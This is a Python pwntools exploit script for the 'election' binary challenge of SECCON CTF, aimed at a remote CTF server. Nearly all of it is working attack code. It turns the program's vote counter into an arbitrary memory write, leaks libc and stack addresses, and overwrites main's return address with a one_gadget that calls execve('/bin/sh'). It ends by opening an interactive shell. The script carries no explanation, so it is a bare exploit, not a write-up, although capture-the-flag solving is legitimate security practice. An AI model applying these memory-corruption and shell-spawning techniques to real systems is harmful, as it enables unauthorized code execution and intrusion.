from pwn import *

# p = process('./election')
p = remote('election.pwn.seccon.jp', 28349)

'''
0xf1117 execve("/bin/sh", rsp+0x70, environ)
constraints:
      [rsp+0x70] == NULL
'''

def menu():
    p.recvuntil('>> ')

def add_one(addr, offset):
    menu()
    p.sendline('2')

    p.recvuntil('n) ')
    p.sendline('n')
    menu()

    p.sendline('oshima')
    menu()

    payload = 'yes\x00' + 'A' * (32 - 4)
    payload += p64(addr - 0x10)
    payload += p64(offset)[:-1]
    p.send(payload)

def stand(name):
    menu()
    p.sendline('1')

    menu()
    p.sendline(name)

# raw_input('wait')
# add_one(0x4242424242424242, 0x43434343)

# 0x602060

ojima_addr = 0x400eeb
list_addr = 0x602028
read_got = 0x601fb8

node1 = 0x602060
node2 = 0x602070

fake = p64(0xffffffffff600101)
fake += p64(node1)
fake += 'C'
stand(fake)

add_one(node1, 0xeb)
time.sleep(0.2)
add_one(node1 + 1, 0xf)
time.sleep(0.2)
add_one(node1 + 2, 0x40)
time.sleep(0.2)
add_one(node1 + 4, 0xff)
time.sleep(0.2)
add_one(node1 + 8, 0x70)
time.sleep(0.2)
add_one(node1 + 9, 0x20)
time.sleep(0.2)
add_one(node1 + 10, 0x60)
time.sleep(0.2)

add_one(node2, 0xb8)
time.sleep(0.2)
add_one(node2 + 1, 0x20)
time.sleep(0.2)
add_one(node2 + 2, 0x60)
time.sleep(0.2)
add_one(node2 + 4, 0xff)
time.sleep(0.2)
add_one(list_addr, 0x20)
time.sleep(0.2)

menu()
p.sendline('2')
p.recvuntil('n) ')
p.sendline('y')
p.recvuntil('Candidates:\n')
p.recvline()
p.recvline()
p.recvuntil('* ')
leak = p.recvuntil('\n', drop=True)
leak = u64(leak.ljust(8, '\x00'))
libc_base = leak - 0xf7220
print 'libc base: %s' % hex(libc_base)
one_gadget = libc_base + 0xf1117
environ = libc_base + 0x3c6f38
menu()
p.sendline('x')

print 'environ: %s' % hex(environ)
node3 = 0x602040

def write8(addr, value, target, l):
    for i in xrange(l):
        v = value & 0xff

        if v < target[i]:
            add_v = v + 0x100 - target[i]
        else:
            add_v = v - target[i]
        add_vec = None
        if add_v < 0x80:
            add_vec = [add_v, 0x0, 0x0, 0x0]
        else:
            add_vec = [add_v, 0xff, 0xff, 0xff]

        for j in xrange(4):
            target[i + j] = target[i + j] + add_vec[j]
            if target[i + j] >= 0x100:
                target[i + j + 1] = target[i + j + 1] + 1
                target[i + j] = target[i + j] - 0x100

        add_one(addr, add_v)
        time.sleep(0.2)
        addr += 1
        value = value >> 8

    # for i in xrange(12):
    #    print hex(target[i]),

target = [0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00]
write8(node3, environ, target, 8)
target = [0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00]
write8(node2 + 8, node3, target, 8)

menu()
p.sendline('2')
p.recvuntil('n) ')
p.sendline('y')
p.recvuntil('* ')
p.recvuntil('* ')
p.recvuntil('* ')
time.sleep(0.2)
p.recvuntil('* ')
leak = p.recvuntil('\n', drop=True)
leak = u64(leak.ljust(8, '\x00'))
print 'stack leak: %s' % hex(leak)
ret_addr = leak - 0xf0
print 'main ret: %s' % hex(ret_addr)
main_ret_addr = libc_base + 0x20830
print hex(main_ret_addr)
print hex(one_gadget)

menu()
p.sendline('x')

target = [0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00]
for i in xrange(4):
    target[i] = main_ret_addr & 0xff
    main_ret_addr = main_ret_addr >> 8

write8(ret_addr, one_gadget, target, 4)

menu()
p.sendline('0')

p.interactive()
